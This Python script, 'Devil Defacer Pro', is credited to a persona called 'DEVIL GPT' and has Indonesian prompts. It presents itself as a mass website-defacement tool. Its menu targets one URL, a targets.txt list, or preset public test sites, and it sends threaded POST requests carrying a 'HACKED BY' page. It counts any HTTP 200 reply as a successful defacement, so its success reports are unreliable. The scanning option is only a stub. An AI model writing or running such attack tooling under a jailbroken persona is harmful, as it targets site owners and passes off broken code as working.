#!/usr/bin/env python3
# 😈 DEVIL DEFACER PRO - BY DEVIL GPT 😈
import requests
import threading
import os
import sys
import time
from datetime import datetime

class DevilDefacerPro:
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.version = "v5.0"
        self.author = "DEVIL GPT"
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def banner(self):
        print("""\033[91m
    ██████╗ ███████╗██╗   ██╗██╗██╗        ██████╗ ███████╗███████╗ █████╗ ██████╗ ███████╗██████╗ 
    ██╔══██╗██╔════╝██║   ██║██║██║        ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██║  ██║█████╗  ██║   ██║██║██║        ██║  ██║█████╗  █████╗  ███████║██████╔╝█████╗  ██████╔╝
    ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║        ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██╔══██╗██╔══╝  ██╔══██╗
    ██████╔╝███████╗ ╚████╔╝ ██║███████╗   ██████╔╝███████╗██║     ██║  ██║██║  ██║███████╗██║  ██║
    ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝   ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                
    \033[93m╔══════════════════════════════════════════════════════════════════════════════╗
    ║                          \033[91m🔥 DEVIL DEFACER PRO {} 🔥\033[93m                         ║
    ║                         \033[91m💀 CREATED BY: {} 💀\033[93m                         ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    \033[0m""".format(self.version, self.author))
    
    def show_menu(self):
        print("""\033[92m
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                            \033[91m🎯 MAIN MENU\033[92m                                   ║
    ╠══════════════════════════════════════════════════════════════════════════════╣
    ║  \033[93m[1]\033[92m 🚀 QUICK DEFACE ATTACK    - Auto scan & attack vulnerable sites      ║
    ║  \033[93m[2]\033[92m 🎯 CUSTOM TARGET ATTACK  - Input specific target URL                ║
    ║  \033[93m[3]\033[92m 📁 MASS FILE ATTACK      - Attack from targets.txt file            ║
    ║  \033[93m[4]\033[92m 🔍 SCAN VULNERABILITIES  - Scan for SQLi, XSS, LFI                 ║
    ║  \033[93m[5]\033[92m ⚙️  TOOLS SETTINGS        - Configure attack parameters             ║
    ║  \033[93m[6]\033[92m ❌ EXIT                  - Keluar dari tools setan                 ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    \033[0m""")
    
    def loading_animation(self, text):
        print(f"\033[93m⏳ {text}", end="", flush=True)
        for i in range(3):
            time.sleep(0.5)
            print("\033[93m.\033[0m", end="", flush=True)
        print()
    
    def quick_attack(self):
        self.clear_screen()
        self.banner()
        print("\033[92m\n    🚀 QUICK DEFACE ATTACK MODE")
        print("    ════════════════════════════════\033[0m")
        
        self.loading_animation("Scanning for vulnerable targets")
        
        # Auto targets
        targets = [
            "http://testphp.vulnweb.com",
            "http://demo.testfire.net",
            "http://zero.webappsecurity.com"
        ]
        
        custom = input("\033[96m    🎯 Masukkan target tambahan (optional): \033[0m").strip()
        if custom:
            targets.append(custom)
            
        print(f"\033[92m    📡 Menyerang {len(targets)} target...\033[0m")
        self.execute_attack(targets)
    
    def custom_attack(self):
        self.clear_screen()
        self.banner()
        print("\033[92m\n    🎯 CUSTOM TARGET ATTACK MODE")
        print("    ════════════════════════════════\033[0m")
        
        url = input("\033[96m    🎯 Masukkan URL target: \033[0m").strip()
        if not url:
            print("\033[91m    ❌ URL tidak boleh kosong!\033[0m")
            return
            
        print(f"\033[92m    📡 Menyerang: {url}\033[0m")
        self.execute_attack([url])
    
    def mass_attack(self):
        self.clear_screen()
        self.banner()
        print("\033[92m\n    📁 MASS FILE ATTACK MODE")
        print("    ════════════════════════════════\033[0m")
        
        if not os.path.exists("targets.txt"):
            print("\033[91m    ❌ File targets.txt tidak ditemukan!\033[0m")
            create = input("\033[96m    Buat file targets.txt? (y/n): \033[0m").lower()
            if create == 'y':
                self.create_target_file()
            return
            
        with open("targets.txt", "r") as f:
            targets = [line.strip() for line in f if line.strip()]
            
        print(f"\033[92m    📡 Menemukan {len(targets)} target dalam file\033[0m")
        self.execute_attack(targets)
    
    def create_target_file(self):
        sample = """http://example1.com
http://example2.com
http://example3.com"""
        
        with open("targets.txt", "w") as f:
            f.write(sample)
        print("\033[92m    ✅ File targets.txt berhasil dibuat!\033[0m")
        print("\033[93m    📝 Edit file tersebut dengan target asli Anda\033[0m")
    
    def execute_attack(self, targets):
        print("\033[92m    🔥 Memulai serangan Devil Mode...\033[0m")
        
        def attack_target(url):
            try:
                devil_html = """<html><body style="background:#000;color:#f00;text-align:center;padding:20%">
                <h1>🔥 HACKED BY DEVIL DEFACER PRO 🔥</h1>
                <p>Security is just an illusion!</p></body></html>"""
                
                methods = [
                    lambda: requests.post(url + "/", data=devil_html, timeout=5),
                    lambda: requests.post(url + "/index.html", data=devil_html, timeout=5),
                ]
                
                for method in methods:
                    try:
                        response = method()
                        if response.status_code == 200:
                            print(f"\033[92m    ✅ BERHASIL: {url}\033[0m")
                            self.success += 1
                            return
                    except:
                        continue
                        
                print(f"\033[91m    ❌ GAGAL: {url}\033[0m")
                self.failed += 1
                
            except Exception as e:
                print(f"\033[91m    💥 ERROR: {url} - {str(e)}\033[0m")
                self.failed += 1
        
        # Multi-threading attack
        threads = []
        for target in targets:
            thread = threading.Thread(target=attack_target, args=(target,))
            threads.append(thread)
            thread.start()
            time.sleep(0.2)
        
        for thread in threads:
            thread.join()
        
        # Results
        print(f"\033[92m\n    📊 HASIL SERANGAN:")
        print(f"    ✅ Berhasil: {self.success}")
        print(f"    ❌ Gagal: {self.failed}")
        print(f"    📈 Success Rate: {(self.success/len(targets))*100:.1f}%\033[0m")
        
        input("\n\033[96m    Press Enter to continue...\033[0m")
    
    def run(self):
        while True:
            self.clear_screen()
            self.banner()
            self.show_menu()
            
            choice = input("\033[96m    🎯 Pilih menu [1-6]: \033[0m").strip()
            
            if choice == "1":
                self.quick_attack()
            elif choice == "2":
                self.custom_attack()
            elif choice == "3":
                self.mass_attack()
            elif choice == "4":
                print("\033[93m    🔍 Fitur scanning dalam pengembangan...\033[0m")
                time.sleep(2)
            elif choice == "5":
                print("\033[93m    ⚙️  Settings menu dalam pengembangan...\033[0m")
                time.sleep(2)
            elif choice == "6":
                print("\033[91m\n    👋 Keluar dari Devil Defacer Pro...\033[0m")
                time.sleep(1)
                break
            else:
                print("\033[91m    ❌ Pilihan tidak valid!\033[0m")
                time.sleep(1)

# JALANKAN TOOLS
if __name__ == "__main__":
    try:
        devil = DevilDefacerPro()
        devil.run()
    except KeyboardInterrupt:
        print("\033[91m\n    ⚠️  Program dihentikan oleh user\033[0m")
    except Exception as e:
        print(f"\033[91m    💥 Error: {str(e)}\033[0m")
